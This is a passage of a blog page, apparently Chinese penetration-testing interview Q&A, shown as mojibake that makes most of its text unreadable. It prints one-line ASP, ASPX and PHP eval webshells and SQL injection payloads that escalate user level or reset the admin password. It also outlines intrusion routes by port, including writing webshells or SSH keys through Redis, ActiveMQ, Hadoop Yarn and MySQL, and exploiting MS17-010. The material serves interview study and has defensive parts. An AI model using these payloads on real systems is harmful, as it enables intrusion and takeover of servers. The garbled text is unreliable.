title="è¯´å‡ºè‡³å°‘ä¸‰ç§ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼Œä»¥åŠä¿®å¤æ–¹å¼"></a>è¯´å‡ºè‡³å°‘ä¸‰ç§ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼Œä»¥åŠä¿®å¤æ–¹å¼</h2><p>å¯†ç æ‰¾å›æ¼æ´ä¸­å­˜åœ¨ï¼šå¯†ç å…è®¸æš´åŠ›ç ´è§£ å­˜åœ¨é€šç”¨å‹æ‰¾å›å‡­è¯ å¯ä»¥è·³è¿‡éªŒè¯æ­¥éª¤ æ‰¾å›å‡­è¯å¯ä»¥æ‹¦åŒ…è·å– ç­‰æ–¹å¼æ¥é€šè¿‡å‚å•†æä¾›çš„å¯†ç æ‰¾å›åŠŸèƒ½æ¥å¾—åˆ°å¯†ç ã€‚<br>èº«ä»½è®¤è¯æ¼æ´ä¸­æœ€å¸¸è§çš„æ˜¯ï¼š ä¼šè¯å›ºå®šæ”»å‡» Cookie ä»¿å†’ åªè¦å¾—åˆ° Session æˆ– Cookie å³å¯ä¼ªé€ ç”¨æˆ·èº«ä»½ã€‚<br>éªŒè¯ç æ¼æ´ä¸­å­˜åœ¨ï¼š éªŒè¯ç å…è®¸æš´åŠ›ç ´è§£ éªŒè¯ç å¯ä»¥é€šè¿‡ Javascript æˆ–è€…æ”¹åŒ…çš„æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</p><h2 id="sqlmap-æ€ä¹ˆå¯¹ä¸€ä¸ªæ³¨å…¥ç‚¹æ³¨å…¥"><a href="#sqlmap-æ€ä¹ˆå¯¹ä¸€ä¸ªæ³¨å…¥ç‚¹æ³¨å…¥" class="headerlink" title="sqlmap æ€ä¹ˆå¯¹ä¸€ä¸ªæ³¨å…¥ç‚¹æ³¨å…¥**"></a>sqlmap æ€ä¹ˆå¯¹ä¸€ä¸ªæ³¨å…¥ç‚¹æ³¨å…¥**</h2><ol><li>å¦‚æœæ˜¯ GET å‹æ³¨å…¥ç‚¹ï¼Œç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼š<code>sqlmap -u &quot;æ³¨å…¥ç‚¹ç½‘å€&quot;</code></li><li>å¦‚æœæ˜¯ POST å‹æ³¨å…¥ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š<code>sqlmap -u &quot;æ³¨å…¥ç‚¹ç½‘å€&quot; --data=&quot;post çš„å‚æ•°&quot;</code></li><li>å¦‚æœæ˜¯ cookieã€X-Forwarded-For ç­‰ï¼Œå¯ä»¥åœ¨è®¿é—®çš„æ—¶å€™ï¼Œç”¨ Burp Suite æŠ“åŒ…ï¼Œå°†æ³¨å…¥ç‚¹ç”¨å¼•å·æ›¿æ¢ï¼Œæ”¾åˆ°æ–‡ä»¶é‡Œï¼Œç„¶åä½¿ç”¨å‘½ä»¤ï¼š<code>sqlmap -r &quot;æ–‡ä»¶åœ°å€&quot;</code></li></ol><h2 id="å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­"><a href="#å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­" class="headerlink" title="å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­"></a>å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­</h2><p>if(ascii(substring(â€œhelloâ€, 1, 1))&#x3D;104, sleep(5), 1)</p><h2 id="OWASP-æ¼æ´éƒ½æœ‰å“ªäº›"><a href="#OWASP-æ¼æ´éƒ½æœ‰å“ªäº›" class="headerlink" title="OWASP æ¼æ´éƒ½æœ‰å“ªäº›**"></a>OWASP æ¼æ´éƒ½æœ‰å“ªäº›**</h2><ol><li>SQL æ³¨å…¥é˜²æŠ¤æ–¹æ³•</li><li>å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†</li><li>è·¨ç«™è„šæœ¬æ”»å‡» XSS</li><li>ç›´æ¥å¼•ç”¨ä¸å®‰å…¨çš„å¯¹è±¡</li><li>å®‰å…¨é…ç½®é”™è¯¯é…ç½®</li><li>æ•æ„Ÿä¿¡æ¯æ³„éœ²</li><li>ç¼ºå°‘åŠŸèƒ½çº§çš„è®¿é—®æ§åˆ¶</li><li>è·¨ç«™è¯·æ±‚ä¼ªé€  CSRF</li><li>ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶</li><li>æœªéªŒè¯çš„é‡å®šå‘å’Œè½¬å‘</li></ol><h2 id="SQL-é‡Œé¢åªæœ‰-update-æ€ä¹ˆåˆ©ç”¨"><a href="#SQL-é‡Œé¢åªæœ‰-update-æ€ä¹ˆåˆ©ç”¨" class="headerlink" title="SQL é‡Œé¢åªæœ‰ update æ€ä¹ˆåˆ©ç”¨**"></a>SQL é‡Œé¢åªæœ‰ update æ€ä¹ˆåˆ©ç”¨**</h2><p>å…ˆç†è§£è¿™å¥ SQLï¼š<code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code><br>å¦‚æœæ­¤ SQL è¢«ä¿®æ”¹æˆä»¥ä¸‹å½¢å¼ï¼Œå°±å®ç°äº†æ³¨å…¥ã€‚</p><ol><li><p>ä¿®æ”¹ homepage å€¼ä¸º <code>http://xxx.net&#39;, userlevel=&#39;3</code><br>ä¹‹å SQL è¯­å¥å˜ä¸ºï¼š<code>UPDATE user SET password=&#39;mypass&#39;, homepage=&#39;http://xxx.net&#39;, userlevel=&#39;3&#39; WHERE id=&#39;$id&#39;</code><br>userlevel ä¸ºç”¨æˆ·çº§åˆ«</p></li><li><p>ä¿®æ”¹ password å€¼ä¸º <code>mypass&#39;)&#39; WHERE username=&#39;admin&#39;#</code><br>ä¹‹å SQL è¯­å¥å˜ä¸ºï¼š<code>UPDATE user SET password=&#39;MD5(mypass)&#39; WHERE username=&#39;admin&#39;#&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></p></li><li><p>ä¿®æ”¹ id å€¼ä¸º <code>&#39; OR username=&#39;admin&#39;</code><br>ä¹‹å SQL è¯­å¥å˜ä¸ºï¼š<code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;&#39; OR username=&#39;admin&#39;</code></p></li></ol><h3 id="è®²è§£ï¼š"><a href="#è®²è§£ï¼š" class="headerlink" title="è®²è§£ï¼š"></a>è®²è§£ï¼š</h3><p>è¿™æ®µå†…å®¹æè¿°äº†åœ¨SQLæ³¨å…¥æ”»å‡»ä¸­ï¼Œå¦‚ä½•åˆ©ç”¨<code>UPDATE</code>è¯­å¥è¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚SQLæ³¨å…¥æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œæ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨SQLè¯­å¥ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä»¥è·å–ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚</p><ol><li><strong>ä¿®æ”¹<code>homepage</code>å€¼</strong>ï¼šé€šè¿‡å°†<code>homepage</code>å‚æ•°ä¿®æ”¹ä¸ºåŒ…å«å•å¼•å·çš„URLï¼Œå¯ä»¥ç ´ååŸæœ‰çš„SQLè¯­å¥ç»“æ„ï¼Œä½¿å¾—SQLè¯­å¥æ‰§è¡Œæ”»å‡»è€…æƒ³è¦çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œæ·»åŠ <code>userlevel</code>å‚æ•°å¯ä»¥æ’å…¥é¢å¤–çš„SQLå‘½ä»¤ã€‚</li><li><strong>ä¿®æ”¹<code>password</code>å€¼</strong>ï¼šé€šè¿‡åœ¨<code>password</code>å‚æ•°ä¸­æ’å…¥å•å¼•å·å’Œæ³¨é‡Šç¬¦å·<code>#</code>ï¼Œå¯ä»¥æ³¨é‡Šæ‰<code>WHERE</code>å­å¥åé¢çš„å†…å®¹ï¼Œä½¿å¾—<code>WHERE</code>æ¡ä»¶å¤±æ•ˆï¼Œä»è€Œå½±å“æ‰€æœ‰ç”¨æˆ·ã€‚</li><li><strong>ä¿®æ”¹<code>id</code>å€¼</strong>ï¼šé€šè¿‡å°†<code>id</code>å‚æ•°ä¿®æ”¹ä¸º<code>&#39; OR username=&#39;admin&#39;</code>ï¼Œå¯ä»¥ç»•è¿‡<code>WHERE</code>æ¡ä»¶ï¼Œä½¿å¾—<code>UPDATE</code>è¯­å¥å¯¹æ‰€æœ‰ç”¨æˆ·åä¸º<code>admin</code>çš„ç”¨æˆ·ç”Ÿæ•ˆã€‚</li></ol><h2 id="DOM-å‹å’Œ-XSS-è‡ªåŠ¨åŒ–æµ‹è¯•æˆ–äººå·¥æµ‹è¯•"><a href="#DOM-å‹å’Œ-XSS-è‡ªåŠ¨åŒ–æµ‹è¯•æˆ–äººå·¥æµ‹è¯•" class="headerlink" title="DOM å‹å’Œ XSS è‡ªåŠ¨åŒ–æµ‹è¯•æˆ–äººå·¥æµ‹è¯•**"></a>DOM å‹å’Œ XSS è‡ªåŠ¨åŒ–æµ‹è¯•æˆ–äººå·¥æµ‹è¯•**</h2><p>äººå·¥æµ‹è¯•æ€è·¯ï¼šæ‰¾åˆ°ç±»ä¼¼ <code>document.write</code>ã€<code>innerHTML</code> èµ‹å€¼ã€<code>outerHTML</code> èµ‹å€¼ã€<code>window.location</code> æ“ä½œã€å†™ <code>javascript</code> åå†…å®¹ã€<code>eval</code>ã€<code>setTimeout</code>ã€<code>setInterval</code> ç­‰ç›´æ¥æ‰§è¡Œä¹‹ç±»çš„å‡½æ•°ç‚¹ã€‚<br>æ‰¾åˆ°å…¶å˜é‡ï¼Œå›æº¯å˜é‡æ¥æºè§‚å¯Ÿæ˜¯å¦å¯æ§ï¼Œæ˜¯å¦ç»è¿‡å®‰å…¨å‡½æ•°ã€‚è‡ªåŠ¨åŒ–æµ‹è¯•å‚è€ƒé“å“¥çš„åšå®¢ï¼Œæ€è·¯æ˜¯ä»è¾“å…¥å…¥æ‰‹ï¼Œè§‚å¯Ÿå˜é‡ä¼ é€’çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨å±é™©å‡½æ•°è¾“å‡ºï¼Œä¸­é€”æ˜¯å¦æœ‰ç»è¿‡å®‰å…¨å‡½æ•°ã€‚ä½†æ˜¯è¿™æ ·å°±éœ€è¦æœ‰ä¸€ä¸ª <code>javascript</code> è§£æå™¨ï¼Œå¦åˆ™ä¼šæ¼æ‰ä¸€äº›é€šè¿‡ <code>js</code> æ‰§è¡Œå¸¦å…¥çš„éƒ¨åˆ†å†…å®¹ã€‚</p><h2 id="å¯¹äº-XSS-æ€ä¹ˆä¿®è¡¥å»ºè®®"><a href="#å¯¹äº-XSS-æ€ä¹ˆä¿®è¡¥å»ºè®®" class="headerlink" title="å¯¹äº XSS æ€ä¹ˆä¿®è¡¥å»ºè®®"></a>å¯¹äº XSS æ€ä¹ˆä¿®è¡¥å»ºè®®</h2><p>è¾“å…¥ç‚¹æ£€æŸ¥ï¼šå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œåˆæ³•æ€§æ£€æŸ¥ï¼Œä½¿ç”¨ filter è¿‡æ»¤æ•æ„Ÿå­—ç¬¦æˆ–å¯¹è¾“å…¥è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œé’ˆå¯¹ç‰¹å®šç±»å‹æ•°æ®è¿›è¡Œæ ¼å¼æ£€æŸ¥ã€‚é’ˆå¯¹è¾“å…¥ç‚¹çš„æ£€æŸ¥æœ€å¥½æ”¾åœ¨æœåŠ¡å™¨ç«¯å®ç°ã€‚<br>è¾“å‡ºç‚¹æ£€æŸ¥ï¼šå¯¹å˜é‡è¾“å‡ºåˆ° HTML é¡µé¢ä¸­æ—¶ï¼Œå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œè¾“å‡ºåœ¨ HTML ä¸­æ—¶ï¼Œå¯¹å…¶è¿›è¡Œ HTMLEncodeï¼Œå¦‚æœè¾“å‡ºåœ¨ Javascript è„šæœ¬ä¸­æ—¶ï¼Œå¯¹å…¶è¿›è¡Œ JavascriptEncodeã€‚å¯¹ä½¿ç”¨ JavascriptEncode çš„å˜é‡éƒ½æ”¾åœ¨å¼•å·ä¸­å¹¶è½¬ä¹‰å±é™©å­—ç¬¦ï¼Œdata éƒ¨åˆ†å°±æ— æ³•é€ƒé€¸å‡ºå¼•å·å¤–æˆä¸º code çš„ä¸€éƒ¨åˆ†ã€‚è¿˜å¯ä»¥ä½¿ç”¨æ›´åŠ ä¸¥æ ¼çš„æ–¹æ³•ï¼Œå¯¹æ‰€æœ‰æ•°å­—å­—æ¯ä¹‹å¤–çš„å­—ç¬¦éƒ½ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç ã€‚æ­¤å¤–ï¼Œè¦æ³¨æ„åœ¨æµè§ˆå™¨ä¸­ï¼ŒHTML çš„è§£æä¼šä¼˜å…ˆäº Javascript çš„è§£æï¼Œç¼–ç çš„æ–¹å¼ä¹Ÿéœ€è¦è€ƒè™‘æ¸…æ¥šã€‚<br>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰åš HTTPOnly å¯¹ Cookie åŠ«æŒåšé™åˆ¶ã€‚</p><h2 id="CSRF-çš„é˜²å¾¡"><a href="#CSRF-çš„é˜²å¾¡" class="headerlink" title="CSRF çš„é˜²å¾¡"></a>CSRF çš„é˜²å¾¡</h2><p>éªŒè¯ Refererã€æ·»åŠ  token</p><h2 id="token-å’Œ-referer-åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜"><a href="#token-å’Œ-referer-åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜" class="headerlink" title="token å’Œ referer åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜"></a>token å’Œ referer åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜</h2><p>token å®‰å…¨ç­‰çº§æ›´é«˜ï¼Œå› ä¸ºå¹¶ä¸æ˜¯ä»»ä½•æœåŠ¡å™¨éƒ½å¯ä»¥å–å¾— refererï¼Œå¦‚æœä» HTTPS è·³åˆ° HTTPï¼Œä¹Ÿä¸ä¼šå‘é€ refererã€‚å¹¶ä¸” FLASH ä¸€äº›ç‰ˆæœ¬ä¸­å¯ä»¥è‡ªå®šä¹‰ refererã€‚ä½†æ˜¯ token çš„è¯ï¼Œè¦ä¿è¯å…¶è¶³å¤Ÿéšæœºä¸”ä¸å¯æ³„éœ²ã€‚</p><h2 id="å¯¹-referer-çš„éªŒè¯ï¼Œä»ä»€ä¹ˆè§’åº¦å»åšï¼Ÿå¦‚æœåšï¼Œæ€ä¹ˆæœç»é—®é¢˜"><a href="#å¯¹-referer-çš„éªŒè¯ï¼Œä»ä»€ä¹ˆè§’åº¦å»åšï¼Ÿå¦‚æœåšï¼Œæ€ä¹ˆæœç»é—®é¢˜" class="headerlink" title="å¯¹ referer çš„éªŒè¯ï¼Œä»ä»€ä¹ˆè§’åº¦å»åšï¼Ÿå¦‚æœåšï¼Œæ€ä¹ˆæœç»é—®é¢˜"></a>å¯¹ referer çš„éªŒè¯ï¼Œä»ä»€ä¹ˆè§’åº¦å»åšï¼Ÿå¦‚æœåšï¼Œæ€ä¹ˆæœç»é—®é¢˜</h2><p>å¯¹ header ä¸­çš„ referer çš„éªŒè¯ï¼Œä¸€ä¸ªæ˜¯ç©º refererï¼Œä¸€ä¸ªæ˜¯ referer è¿‡æ»¤æˆ–è€…æ£€æµ‹ä¸å®Œå–„ã€‚ä¸ºäº†æœç»è¿™ç§é—®é¢˜ï¼Œåœ¨éªŒè¯çš„ç™½åå•ä¸­ï¼Œæ­£åˆ™è§„åˆ™åº”å½“å†™å®Œå–„ã€‚</p><h2 id="é’ˆå¯¹-token-æ”»å‡»ï¼Œä½ ä¼šå¯¹-token-çš„å“ªæ–¹é¢è¿›è¡Œæµ‹è¯•"><a href="#é’ˆå¯¹-token-æ”»å‡»ï¼Œä½ ä¼šå¯¹-token-çš„å“ªæ–¹é¢è¿›è¡Œæµ‹è¯•" class="headerlink" title="é’ˆå¯¹ token æ”»å‡»ï¼Œä½ ä¼šå¯¹ token çš„å“ªæ–¹é¢è¿›è¡Œæµ‹è¯•"></a>é’ˆå¯¹ token æ”»å‡»ï¼Œä½ ä¼šå¯¹ token çš„å“ªæ–¹é¢è¿›è¡Œæµ‹è¯•</h2><p>é’ˆå¯¹ token çš„æ”»å‡»ï¼Œä¸€æ˜¯å¯¹å®ƒæœ¬èº«çš„æ”»å‡»ï¼Œé‡æ”¾æµ‹è¯•ä¸€æ¬¡æ€§ã€åˆ†æåŠ å¯†è§„åˆ™ã€æ ¡éªŒæ–¹å¼æ˜¯å¦æ­£ç¡®ç­‰ï¼ŒäºŒæ˜¯ç»“åˆä¿¡æ¯æ³„éœ²æ¼æ´å¯¹å®ƒçš„è·å–ï¼Œç»“åˆç€å‘èµ·ç»„åˆæ”»å‡»ã€‚ä¿¡æ¯æ³„éœ²æœ‰å¯èƒ½æ˜¯ç¼“å­˜ã€æ—¥å¿—ã€getï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯åˆ©ç”¨è·¨ç«™ã€‚å¾ˆå¤šè·³è½¬ç™»å½•çš„éƒ½ä¾èµ– tokenï¼Œæœ‰ä¸€ä¸ªè·³è½¬æ¼æ´åŠ åå°„å‹è·¨ç«™å°±å¯ä»¥ç»„åˆæˆç™»å½•åŠ«æŒäº†ã€‚<br>å¦å¤–ä¹Ÿå¯ä»¥ç»“åˆç€å…¶å®ƒä¸šåŠ¡æ¥æè¿° token çš„å®‰å…¨æ€§åŠè®¾è®¡ä¸å¥½æ€ä¹ˆè¢«ç»•è¿‡æ¯”å¦‚æŠ¢çº¢åŒ…ä¸šåŠ¡ä¹‹ç±»çš„ã€‚</p><h2 id="ç®€è¿°ä½ çŸ¥é“çš„ä¸€å¥è¯æœ¨é©¬"><a href="#ç®€è¿°ä½ çŸ¥é“çš„ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ç®€è¿°ä½ çŸ¥é“çš„ä¸€å¥è¯æœ¨é©¬**"></a>ç®€è¿°ä½ çŸ¥é“çš„ä¸€å¥è¯æœ¨é©¬**</h2><p>ASPï¼š<code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code><br>ASP.NETï¼šï¼ˆaspxï¼‰<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;)%&gt;</code><br>PHPï¼š<code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p><h2 id="å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€äº†-21-80-445-3306-11211-ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯"><a href="#å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€äº†-21-80-445-3306-11211-ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯" class="headerlink" title="å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€äº† 21, 80, 445, 3306, 11211 ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯"></a>å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€äº† 21, 80, 445, 3306, 11211 ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯</h2><p>é’ˆå¯¹ 21 ç«¯å£ï¼š21 ç«¯å£å¼€æ”¾è¡¨æ˜è¿è¡Œ FTP æœåŠ¡ï¼Œå¯ä»¥å°è¯•å¯¹ FTP è¿›è¡Œçˆ†ç ´å’Œå°è¯•åŒ¿å anonymous&#x2F;ç©ºç™»é™†ã€‚ä»¥åŠä½¿ç”¨ MS12-073 çš„æ”»å‡»å°è¯•ã€‚<br>é’ˆå¯¹ 80 ç«¯å£ï¼š80 ç«¯å£å¯¹åº” web æœåŠ¡ï¼Œå¯é€šè¿‡ä¿¡æ¯æ”¶é›†ï¼Œåˆ†æå‡ºå»ä¸­é—´ä»¶ç±»å‹å’Œç‰ˆæœ¬ï¼Œåç«¯è¯­è¨€ç±»å‹ã€‚è¿˜æœ‰ CMS ç±»å‹ï¼Œçœ‹æ˜¯å¦æœ‰å·²çŸ¥æ¼æ´å¯åˆ©ç”¨ã€‚è‹¥æ— ï¼Œå¯¹ Web ç«™ç‚¹è¿›è¡Œæ¸—é€æµ‹è¯•ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç­‰æ¼æ´ã€‚<br>é’ˆå¯¹ 445 ç«¯å£ï¼š445 ç«¯å£å¯¹åº”ç½‘ç»œå…±äº« SMB æœåŠ¡ï¼Œå¯å°è¯•åˆ©ç”¨ ms08-067, ms17-010 ç­‰æº¢å‡ºæ¼æ´å¯¹æœåŠ¡å™¨è¿›è¡Œæ”»å‡»ã€‚ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨ IPC$è¿›è¡Œæ”»å‡»ã€‚<br>é’ˆå¯¹ 3306 mysql ç«¯å£ï¼š3306 ç«¯å£ä¹Ÿå¯ä»¥é‡‡ç”¨çˆ†ç ´çš„æ–¹å¼ã€‚æˆåŠŸåå¯ä»¥ç”¨ mysql å†™ webshellï¼Œæˆ–è€…æ„é€  VBS å†™å…¥æœåŠ¡å™¨å¯åŠ¨é¡¹ï¼Œå¸¦æœåŠ¡å™¨é‡å¯å°±å¯ä»¥æ·»åŠ ç®¡ç†å‘˜è´¦å·å’Œæ‰“å¼€ 3389 ç«¯å£ã€‚<br>é’ˆå¯¹ 11211 ç«¯å£ï¼š11211 ç«¯å£æ˜¯ memcached æœåŠ¡çš„ç«¯å£ã€‚memcached é»˜è®¤æƒ…å†µä¸‹å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œtelnet ip å°±å¯ä»¥è·å¾—æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯ã€‚å¯¹è¿›ä¸€æ­¥æ¸—é€æä¾›å¸®åŠ©ã€‚</p><h2 id="å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€æ”¾äº†-22ã€8088ã€8161ã€6379-ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯"><a href="#å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€æ”¾äº†-22ã€8088ã€8161ã€6379-ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯" class="headerlink" title="å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€æ”¾äº† 22ã€8088ã€8161ã€6379 ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯"></a>å‡è®¾æ¸—é€æ—¶å‘ç°æœåŠ¡å™¨å¼€æ”¾äº† 22ã€8088ã€8161ã€6379 ç«¯å£ï¼Œä½ æœ‰ä»€ä¹ˆæ¸—é€æ€è·¯</h2><ol><li>22 ç«¯å£æ˜¯ Linux æœåŠ¡å™¨çš„ SSH è¿œç¨‹ç™»å½•åè®®ï¼Œä¸€èˆ¬ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•</li><li>8088 ç«¯å£æ˜¯ Hadoop Yarn èµ„æºç®¡ç†ç³»ç»Ÿ REST APIå­˜åœ¨æœªæˆæƒæ¼æ´.é€šè¿‡ curl -v -X POSTç”³è¯·æ–°çš„applicationï¼Œæ„é€ ä»»åŠ¡åå³å¯åœ¨ç›¸åº”ç›®å½•ç”Ÿæˆwebshell</li><li>8161 è¿è¡Œç€ Apache ActiveMQã€‚å…¶ Console å­˜åœ¨é»˜è®¤ç«¯å£å’Œé»˜è®¤å¯†ç &#x2F;æœªæˆæƒè®¿é—®(é»˜è®¤å¯†ç ä¸º admin:admin)ã€‚å½“ ActiveMQ å¼€å¯ PUT è¯·æ±‚æ—¶(é»˜è®¤å¼€å¯)ï¼Œæ„é€ å¥½ Payload(å³ä¸å­˜åœ¨çš„ç›®å½•)ï¼ŒResponse ä¼šè¿”å›ç›¸åº”çš„ç‰©ç†è·¯å¾„ä¿¡æ¯ã€‚ActiveMQ é»˜è®¤å¼€å¯ PUT æ–¹æ³•ï¼Œå½“ fileserver å­˜åœ¨æ—¶æˆ‘ä»¬å¯ä»¥ä¸Šä¼  jspwebshellã€‚ActiveMQ é™¤äº†æ”¯æŒ PUT åè®®ä¹‹å¤–ï¼Œè¿˜æ”¯æŒ MOVE åè®®ï¼Œå¯å¯¼è‡´ä»»æ„æ–‡ä»¶ç§»åŠ¨æ¼æ´ã€‚</li><li>6379 æ˜¯ Redis æ•°æ®åº“çš„é»˜è®¤ç«¯å£ï¼ŒRedis æœªæˆæƒè®¿é—®å¯ä»¥å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œé€šè¿‡è¿æ¥ redisï¼ˆredis-cliï¼‰ å¯ç›´æ¥å†™å…¥ webshellã€‚å†™å…¥ webshell ååˆ©ç”¨å†°èã€èšå‰‘ç­‰å·¥å…·è¿æ¥ï¼Œè·å– shellã€‚ä»¥åŠå†™å…¥ SSH å…¬é’¥ï¼Œè·å–æœåŠ¡å™¨æƒé™ã€‚å…·ä½“æ“ä½œå¯å‚è€ƒç›¸å…³å·¥å…·æ–‡æ¡£ã€‚</li></ol><h2 id="æ¸—é€æµ‹è¯•æµç¨‹"><a href="#æ¸—é€æµ‹è¯•æµç¨‹" class="headerlink" title="æ¸—é€æµ‹è¯•æµç¨‹"></a>æ¸—é€æµ‹è¯•æµç¨‹</h2><ol><li><p>ä¿¡æ¯æ”¶é›†<br>aã€æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ï¼ˆçœŸå®ipï¼Œç³»ç»Ÿç±»å‹ï¼Œç‰ˆæœ¬ï¼Œå¼€æ”¾ç«¯å£ï¼ŒWAFç­‰ï¼‰<br>bã€ç½‘ç«™æŒ‡çº¹è¯†åˆ«ï¼ˆåŒ…æ‹¬ï¼Œcmsï¼Œcdnï¼Œè¯ä¹¦ç­‰ï¼‰ï¼Œdnsè®°å½•<br>cã€whoisä¿¡æ¯ï¼Œå§“åï¼Œå¤‡æ¡ˆï¼Œé‚®ç®±ï¼Œç”µè¯åæŸ¥ï¼ˆé‚®ç®±ä¸¢ç¤¾å·¥åº“ï¼Œç¤¾å·¥å‡†å¤‡ç­‰ï¼‰<br>dã€å­åŸŸåæ”¶é›†ï¼Œæ—ç«™ï¼ŒCæ®µç­‰<br>eã€google hacking é’ˆå¯¹åŒ–æœç´¢ï¼Œpdfæ–‡ä»¶ï¼Œä¸­é—´ä»¶ç‰ˆæœ¬ï¼Œå¼±å£ä»¤æ‰«æç­‰<br>fã€æ‰«æç½‘ç«™ç›®å½•ç»“æ„ï¼Œçˆ†åå°ï¼Œç½‘ç«™bannerï¼Œæµ‹è¯•æ–‡ä»¶ï¼Œå¤‡ä»½ç­‰æ•æ„Ÿæ–‡ä»¶æ³„æ¼ç­‰<br>gã€ä¼ è¾“åè®®ï¼Œé€šç”¨æ¼æ´ï¼Œexpï¼Œgithubæºç ç­‰</p></li><li><p>æ¼æ´æŒ–æ˜<br>aã€æµè§ˆç½‘ç«™ï¼Œçœ‹çœ‹ç½‘ç«™è§„æ¨¡ï¼ŒåŠŸèƒ½ï¼Œç‰¹ç‚¹ç­‰<br>bã€ç«¯å£ï¼Œå¼±å£ä»¤ï¼Œç›®å½•ç­‰æ‰«æï¼Œå¯¹å“åº”çš„ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œæ¯”å¦‚ rsync,å¿ƒè„æ»´è¡€ï¼Œmysql,ftp,ssh å¼±å£ä»¤ç­‰ã€‚<br>cã€XSSï¼ŒSQL æ³¨å…¥ï¼Œä¸Šä¼ ï¼Œå‘½ä»¤æ³¨å…¥ï¼ŒCSRFï¼Œcookie å®‰å…¨æ£€æµ‹ï¼Œæ•æ„Ÿä¿¡æ¯ï¼Œé€šä¿¡æ•°æ®ä¼ è¾“ï¼Œæš´åŠ›ç ´è§£ï¼Œä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œè¶Šæƒè®¿é—®ï¼Œæœªæˆæƒè®¿é—®ï¼Œç›®å½•éå†ï¼Œæ–‡ä»¶åŒ…å«ï¼Œé‡æ”¾æ”»å‡»ï¼ˆçŸ­ä¿¡è½°ç‚¸ï¼‰ï¼ŒæœåŠ¡å™¨æ¼æ´æ£€æµ‹ï¼Œæœ€åä½¿ç”¨æ¼æ‰«å·¥å…·ç­‰</p></li><li><p>æ¼æ´åˆ©ç”¨&amp;æƒé™æå‡<br>aã€mysql ææƒï¼Œserv-u ææƒï¼Œoracle ææƒ<br>bã€windows æº¢å‡ºææƒ<br>cã€linux è„ç‰›ï¼Œå†…æ ¸æ¼æ´ææƒ</p></li><li><p>æ¸…é™¤æµ‹è¯•æ•°æ®&amp;è¾“å‡ºæŠ¥å‘Š<br>æ—¥å¿—ï¼Œæµ‹è¯•æ•°æ®çš„æ¸…ç†<br>æ€»ç»“ï¼Œè¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Šï¼Œé™„ä¿®å¤æ–¹æ¡ˆ</p></li></ol><h2 